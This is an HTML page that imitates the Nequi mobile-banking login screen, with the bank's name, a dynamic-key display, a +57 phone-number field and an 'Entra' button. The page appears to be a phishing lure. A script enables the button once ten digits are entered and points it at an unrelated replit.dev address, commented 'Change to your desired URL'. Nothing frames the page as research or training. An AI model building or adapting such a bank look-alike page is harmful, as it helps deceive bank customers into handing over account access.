<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
        .btn-disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
    </style>
</head>

<body class="bg-[#2b0a3d] flex flex-col items-center justify-center min-h-screen text-white">
    <!-- Top Icons -->
    <div class="absolute top-4 left-4 flex space-x-4">
        <i class="fas fa-question-circle text-xl"></i>
        <i class="fas fa-shield-alt text-xl"></i>
    </div>
    <!-- Dynamic Key -->
    <div class="absolute top-4 right-4 flex items-center space-x-2 bg-gray-800 px-4 py-2 rounded-md">
        <i class="fas fa-sync-alt text-pink-500"></i>
        <span class="text-gray-300 text-sm">Clave dinámica</span>
        <span class="text-white font-bold text-lg">509554</span>
        <i class="fas fa-copy text-gray-400"></i>
    </div>
    <!-- Logo -->
    <div class="flex items-center justify-center mt-20">
        <span class="text-pink-500 text-6xl font-bold">•</span>
        <span class="text-gray-200 text-6xl font-bold">Nequi</span>
    </div>
    <!-- Phone Input and Button -->
    <div class="flex flex-col items-center mt-40 w-full px-8">
        <div class="flex items-center bg-gray-800 rounded-md px-4 py-2 mb-4 w-full max-w-md">
            <span class="text-gray-400">+57</span>
            <input type="text" id="phone-input" class="bg-transparent ml-2 w-full text-gray-200 focus:outline-none"
                maxlength="10" oninput="validateInput()" autocomplete="off">
        </div>
        <a id="enter-link" href="#" class="w-full max-w-md">
            <button id="enter-button" class="bg-pink-500 w-full py-3 rounded-md text-white font-bold btn-disabled"
                disabled>Entra</button>
        </a>
    </div>
    <!-- Bottom Icons -->
    <div class="absolute bottom-4 flex space-x-8">
        <div class="flex flex-col items-center">
            <i class="fas fa-qrcode text-gray-400 text-2xl"></i>
            <span class="text-gray-400 text-sm">Usa tu QR</span>
        </div>
        <div class="flex flex-col items-center">
            <i class="fas fa-credit-card text-gray-400 text-2xl"></i>
            <span class="text-gray-400 text-sm">Paga en Datáfono</span>
        </div>
        <div class="flex flex-col items-center">
            <i class="fas fa-grip-horizontal text-gray-400 text-2xl"></i>
            <span class="text-gray-400 text-sm">by</span>
        </div>
    </div>

    <script>
        function validateInput() {
            const phoneInput = document.getElementById('phone-input');
            const enterButton = document.getElementById('enter-button');
            const enterLink = document.getElementById('enter-link');

            if (phoneInput.value.length === 10) {
                enterButton.classList.remove('btn-disabled');
                enterButton.removeAttribute('disabled');
                enterLink.href = "https://21d684fa-7e94-4304-9b09-8e7ef8336c2d-00-3rzz7r882uz9m.kirk.replit.dev/"; // Change to your desired URL
            } else {
                enterButton.classList.add('btn-disabled');
                enterButton.setAttribute('disabled', 'true');
                enterLink.href = "#";
            }
        }
    </script>
</body>

</html>
